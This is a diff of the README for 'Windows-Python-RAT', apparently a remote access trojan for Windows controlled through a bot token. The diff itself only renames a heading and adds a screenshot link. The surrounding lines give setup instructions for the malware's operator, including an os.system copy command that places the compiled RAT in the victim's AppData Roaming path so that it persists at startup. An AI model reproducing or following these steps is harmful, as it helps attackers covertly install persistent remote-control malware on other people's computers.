@@ -29,8 +29,8 @@ Example for Replace Token:
 
 ![Replace Token](Token.png?raw=true "Replace Token")
 -------------------------------
-# StartUP Settings
-For startup settings, you must first write the name of your bot before compiling it in the **Windows-Python-RAT.py** file. For example, before compiling the RAT file, you need to go to line 281 and name it as an `YOUR-COMPILED-RAT-NAME.exe`.
+# StartUP Setting
+For startup setting, you must first write the name of your bot before compiling it in the **Windows-Python-RAT.py** file. For example, before compiling the RAT file, you need to go to line 281 and name it as an `YOUR-COMPILED-RAT-NAME.exe`.
 
 In Line 281:
 ```python
@@ -39,6 +39,7 @@ os.system('copy YOUR-COMPILED-RAT-NAME.exe "C:\Users\%username%\AppData\Roaming\
 ```
 Video Tutorial Setting Up a Startup on a RAT: [Watch]()
 
+![StartUP Setting](startup.png?raw=true "StartUP Setting")
 -------------------------------
 # Python
 [Windows-Python-RAT](https://github.com/The404Hacking/Windows-Python-RAT/) requires Python version 2.7.x
